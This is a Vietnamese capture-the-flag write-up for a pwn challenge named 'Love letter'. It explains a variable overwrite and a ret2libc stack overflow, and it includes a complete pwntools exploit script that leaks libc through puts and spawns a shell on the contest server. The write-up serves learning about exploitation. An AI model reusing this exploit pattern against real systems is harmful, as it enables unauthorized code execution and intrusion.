# Love letter
#### Hình ảnh ida  
![image](https://user-images.githubusercontent.com/111769169/219405773-390fbd80-cfbc-4392-ad58-fdb303480368.png)  
![image](https://user-images.githubusercontent.com/111769169/219406127-96373797-4cb8-419b-b863-2bc2e2f3643a.png)  
![image](https://user-images.githubusercontent.com/111769169/219406236-27dd9ada-2005-47be-8986-92156db55fe8.png)  
#### Chương trình hoạt động  
> Đầu tiên chương trình nhảy vào hàm loveletter, ta chú ý chỗ while sau, đại loại chương trình sẽ cho chúng ta nhập vào biến v2 
> ![image](https://user-images.githubusercontent.com/111769169/219407499-01d77b66-b3e3-4e49-867a-aa3db9ab050b.png)
___  
> Sau đó ở hàm doubt, nếu ta trả lời khác 'Y' thì chương trình sẽ cho nhập size của v2, và chỉ dưới 250 kí tự, nên ban đầu em hơi lú chỗ này  
> ![image](https://user-images.githubusercontent.com/111769169/219408728-9fa83627-0b11-45f3-8ed8-f94373b5ac4f.png)  
> Sau khi được anh Trí hint thì ta thấy nếu ta trả lời là 'Y' (không thực hiện if) thì biến v2 có thể nhập tuỳ ý, nhưng lúc chạy chương trình thì giá trị v1 là 0 nên không thể nhập cho biến v2. Vấn đề bây giờ là làm sao để OW được v1.
___  
> ta để ý địa chỉ ở các biến thì thấy ![image](https://user-images.githubusercontent.com/111769169/219410942-4fa2201f-5b30-471e-961e-d70cfe2a3a05.png) ![image](https://user-images.githubusercontent.com/111769169/219411007-af0d3399-62ee-4086-baba-85bedb823985.png)  
> thì thấy nếu ta nhập đủ 6969byte ở biến v2 hàm loveletter thì có thể OW giá trị v1 hàm doubt, offset v2 và v1 là 244  
> Tuy nhiên do không có hàm thực thi system mà chỉ có /bin/sh lúc nà em chỉ đoán là libc (do ban đầu file có canary), và sau khi được anh Quý hint thì chắc chắn là leak libc 
___ 
> do em chỉ leak được libc còn lúc đưa hàm system thì lỗi EOF =))  
> Sau khi xin được file script thì chúng ta được như sau  
___
```python
from pwn import *

exe = ELF('main_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
    gdb.attach(p, gdbscript='''
    b*0x00000000004013ba

    b*0x0000000000401388
    
    c
    ''')
    input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.LOCAL:
    p = process(exe.path)
else:
    p = remote('loveletter.securinets.tn', 4040)

# GDB()
##################################
### Stage 1: Leak libc address ###
##################################
sa(b'> ', cyclic(6796) + p64(0x500))
sa(b'> ', b'\n')
sa(b'> ', b'Y')

pop_rdi = 0x00000000004014b3
payload = b'A'*(264) + flat(
    pop_rdi, exe.got['puts'],
    exe.plt['puts'],
    exe.sym['main'],
    )
sa(b'now.\n', payload)
p.recvuntil(b'friend!\n')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
info("Libc base: " + hex(libc.address))

##########################
### Stage 2: Get shell ###
##########################
sa(b'> ', cyclic(6796) + p64(0x500))
sa(b'> ', b'\n')
sa(b'> ', b'Y')

pop_rdi = 0x00000000004014b3
payload = b'A'*(264) + flat(
    0x000000000040101a,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym['system']
    )
sa(b'now.\n', payload)

p.interactive()
```
# Phân tích script  
![image](https://user-images.githubusercontent.com/111769169/219415578-c22f2804-97ad-4b0b-9fbb-75ab0d46e296.png)  
![image](https://user-images.githubusercontent.com/111769169/219414568-52ec4c12-0944-4f7b-9124-39e526a8e5fa.png)  
> ta input đủ 6969 để OW biến v1 hàm doubt  
___
![image](https://user-images.githubusercontent.com/111769169/219416198-056c37cc-4afb-4c8b-8181-26ac29d58353.png) 
![image](https://user-images.githubusercontent.com/111769169/219416439-8f18a7a6-20c0-4bb9-8241-c6f351c09cf2.png)  
> ta nhập 264byte để OW đến địa chỉ rip (em đã tìm offset rip)   
> ![image](https://user-images.githubusercontent.com/111769169/219416972-707cd8d3-ffbb-4b35-a30b-a7fe2d76feb1.png)  
> Sau đó trong flat() thì set thanh rip = là got@put và thực thì hàm put, để leak được file libc, sau đó quay về main
___
![image](https://user-images.githubusercontent.com/111769169/219417932-fa686178-6ecd-49ca-98e9-90ba49b03023.png)
> tính base của libc
___
> ta thực hiện lại lần hai chương trình và đẩy hàm system vào
![image](https://user-images.githubusercontent.com/111769169/219418602-1513688e-6841-4c30-bee9-fced04860c5d.png)
> ở đây địa 0x40101a được thêm vào để khắc phục lỗi xmm1 (lúc em làm thì em hum có dòng này =)))
> em đã thử không thêm địa chỉ này mà nhảy sâu vào hàm system nhưng vẫn không khắc phục được lỗi xmm1
___
#### Tổng kết sai sót
Không theo dõi thông báo giải và lúc được biết có file mới thì vẫn giải trên file cũ. Kết quả là file libc khác với server  
Cần cải thiện quá trình debug.  
#### Kiến thức mới
Thay vì ta set các địa chỉ như này  
![image](https://user-images.githubusercontent.com/111769169/219421279-d0561928-8d27-4c5b-8454-32e98c1eb4d5.png)  
___
Thì hàm flat() đại loại sẽ pack() các dữ liệu mình vào thay vì p64()
![image](https://user-images.githubusercontent.com/111769169/219421953-30160aa1-251b-46ee-a5fc-f375dab9b0b7.png)

# Gift shellcode
